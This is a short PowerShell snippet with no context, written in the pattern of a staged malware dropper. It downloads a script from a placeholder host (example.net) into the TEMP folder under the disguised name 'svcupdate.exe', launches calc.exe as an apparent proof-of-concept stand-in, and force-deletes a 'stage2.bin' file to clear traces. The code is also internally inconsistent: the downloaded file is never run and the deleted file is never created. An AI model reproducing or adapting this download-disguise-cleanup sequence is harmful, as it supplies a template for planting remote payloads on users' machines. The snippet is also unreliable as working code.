$DownloadUrl = "https://example.net/stage1.ps1"
$PayloadPath = "$env:TEMP\svcupdate.exe"
$TimeoutSec = 130
Invoke-WebRequest -Uri $DownloadUrl -OutFile $PayloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
